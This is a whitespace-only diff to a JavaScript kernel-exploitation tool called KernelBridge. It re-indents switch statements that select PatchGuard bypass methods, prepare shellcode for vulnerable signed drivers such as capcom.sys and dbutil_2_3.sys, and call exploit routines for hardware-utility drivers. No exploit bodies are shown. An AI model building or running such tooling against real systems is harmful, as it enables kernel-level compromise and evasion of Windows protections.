@@ -407,17 +407,17 @@ const KernelBridge = {
         });
 
         switch (this.config.patchGuard.method) {
-        case 'exception_hook':
-            this.bypassPGViaExceptionHook();
-            break;
+            case 'exception_hook':
+                this.bypassPGViaExceptionHook();
+                break;
 
-        case 'timer_disable':
-            this.bypassPGViaTimerDisable();
-            break;
+            case 'timer_disable':
+                this.bypassPGViaTimerDisable();
+                break;
 
-        case 'context_swap':
-            this.bypassPGViaContextSwap();
-            break;
+            case 'context_swap':
+                this.bypassPGViaContextSwap();
+                break;
         }
 
         // Disable Driver Signature Enforcement
@@ -933,17 +933,17 @@ const KernelBridge = {
     prepareKernelPayload: function (shellcode) {
         // Different drivers have different input structures
         switch (this.currentDriver.name) {
-        case 'capcom.sys':
-            return this.prepareCapcomPayload(shellcode);
+            case 'capcom.sys':
+                return this.prepareCapcomPayload(shellcode);
 
-        case 'dbutil_2_3.sys':
-            return this.prepareDBUtilPayload(shellcode);
+            case 'dbutil_2_3.sys':
+                return this.prepareDBUtilPayload(shellcode);
 
-        case 'cpuz141.sys':
-            return this.prepareCPUZPayload(shellcode);
+            case 'cpuz141.sys':
+                return this.prepareCPUZPayload(shellcode);
 
-        default:
-            return shellcode;
+            default:
+                return shellcode;
         }
     },
 
@@ -1220,21 +1220,21 @@ const KernelBridge = {
 
                     // Attempt exploitation based on method
                     switch (driver.method) {
-                    case 'msi_afterburner':
-                        self.exploitMSIAfterburnerVuln(handle, driver.ioctl);
-                        break;
-                    case 'physical_memory':
-                        self.exploitPhysicalMemoryAccess(handle, driver.ioctl);
-                        break;
-                    case 'asus_io':
-                        self.exploitAsusIOVuln(handle, driver.ioctl);
-                        break;
-                    case 'gpu_direct':
-                        self.exploitGPUDirectAccess(handle, driver.ioctl);
-                        break;
-                    case 'hwinfo_direct':
-                        self.exploitHWInfoDirect(handle, driver.ioctl);
-                        break;
+                        case 'msi_afterburner':
+                            self.exploitMSIAfterburnerVuln(handle, driver.ioctl);
+                            break;
+                        case 'physical_memory':
+                            self.exploitPhysicalMemoryAccess(handle, driver.ioctl);
+                            break;
+                        case 'asus_io':
+                            self.exploitAsusIOVuln(handle, driver.ioctl);
+                            break;
+                        case 'gpu_direct':
+                            self.exploitGPUDirectAccess(handle, driver.ioctl);
+                            break;
+                        case 'hwinfo_direct':
+                            self.exploitHWInfoDirect(handle, driver.ioctl);
+                            break;
                     }
 
                     send({
